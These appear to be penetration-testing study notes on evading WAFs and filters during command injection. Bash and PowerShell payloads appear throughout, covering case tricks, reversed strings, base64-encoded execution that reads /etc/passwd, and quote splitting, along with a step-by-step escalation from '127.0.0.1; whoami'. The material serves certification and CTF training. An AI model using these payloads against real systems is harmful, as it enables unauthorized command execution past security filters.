🧠 SUMMARY: Advanced Command Obfuscation
When basic injection bypasses don’t work (quotes, ${IFS}, newlines, etc.), it's time to get creative. This section teaches how to sneak past WAFs and aggressive filters with:

Case Manipulation

Reversed Commands

Encoded Payloads

Shell Tricks in Bash & PowerShell

You’re not just throwing whoami at the wall anymore — you’re forging new words that execute like old ones.

🔁 IF THIS, THEN THAT (ITTTT)
IF THIS	DO THAT
Filter blocks your command like whoami, cat, etc.	Try case manipulation (e.g., WhOaMi)
Still filtered (Linux)?	Use $(tr "[A-Z]" "[a-z]"<<<"WhOaMi") or ${a,,}
WAF flags known words even with casing	Reverse the string using rev or PowerShell slice
WAF filters characters (`	, ;, `, etc.)
Bash-specific system	Use Bash subshells $(...), <<<, tr, rev, etc.
PowerShell-specific system	Use iex "$(...)" with b64 + Unicode encoding
Filters catch b64 or base64 usage	Swap in sh, openssl enc -d -base64, or hex via xxd
🧪 TECHNIQUES & TOOLS
1. 🔡 Case Manipulation
Windows: Just change case. WhOaMi, WHOAMI, whatever.

Linux: Bash is case-sensitive, so wrap with lowercase trick:

bash
Copy
Edit
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")
2. 🔁 Reversed Commands
Reverse the command using rev (Linux) or slicing (PowerShell):

bash
Copy
Edit
$(rev<<<'imaohw')
powershell
Copy
Edit
iex "$('imaohw'[-1..-20] -join '')"
3. 🔐 Encoded Commands (Base64)
🐧 Linux:
Encode your real command:

bash
Copy
Edit
echo -n 'cat /etc/passwd | grep 33' | base64
Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

Decode + execute:

bash
Copy
Edit
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
✅ No |, no ;, no spaces.

🪟 Windows:
Encode:

powershell
Copy
Edit
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
Decode + execute:

powershell
Copy
Edit
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
🔄 PATTERNS TO MEMORIZE
Goal	Pattern
Lowercase obfuscation	$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
Reverse command	$(rev<<<'imaohw')
Base64 decode + execute	bash<<<$(base64 -d<<<...)
PowerShell base64 exec	iex "$(...decode logic...)”
Hide command keywords	w'h'o'am'i, w"h"o'am"i
🧨 FINAL THOUGHTS
❗️These techniques are surgical. They're used when:

You're up against a solid WAF.

You’re in a real-world pentest.

You’re taking CPTS, OSCP, or doing CTFs that punish “basic” payloads.

💀 Most devs never expect:

Custom encoded payloads

Character slicing

Rev-based reversal

Bash/PowerShell hybrid voodoo

💡 TL;DR:
Yes, it's mostly “throw it at the wall and see what sticks” at first — but there are clues and logic you can follow before brute-force creativity kicks in.

🧠 Step-by-Step Flow (What to Try and When):
1. Initial Recon & Payload Test
Try a basic: 127.0.0.1; whoami

If blocked → look at:

Error returned (custom app message? WAF page?)

Does it still ping? (might tell you partial command was accepted)

2. Try Basic Operators First
;, &&, ||, %0a

See what’s allowed. You’ll quickly know what chars are being filtered.

3. Space Bypass Attempts
${IFS}, %09, {ls,-la}

If whoami works, but not with a space: you know it’s a space filter.

4. Command Word Blocked?
Test w'h'o'am'i, w"h"oami, who$@ami, etc.

If those work: it’s a blacklisted word, not behavior.

🧬 If That Fails → Advanced Obfuscation Mode
At this point, you're in creative territory. Here’s when to try the fancy stuff:

Technique	When to Try
Reversing (rev)	If literal whoami is blacklisted
Case Manipulation	If blacklists are lowercase-only
Base64 Encoded	If special chars are filtered, like `
Char-by-char (tr)	If words are blocked but alphabet isn’t
Command building (string concat)	If full words don’t fly, but individual letters do
🛠️ Think of it like Lockpicking:
Start with simple tools (tension + rake)

If it doesn’t budge → go custom: single-pin picking, weird angles

Your ears (or here, responses) tell you what the lock is doing

⚔️ CPTS Mindset:
If you see command injection works, you WILL get a shell. You just gotta pivot around whatever clown-ass filter the dev tossed in.

No filter can stop you — just slow you down. But slowing down the wrong guy is still a losing game.
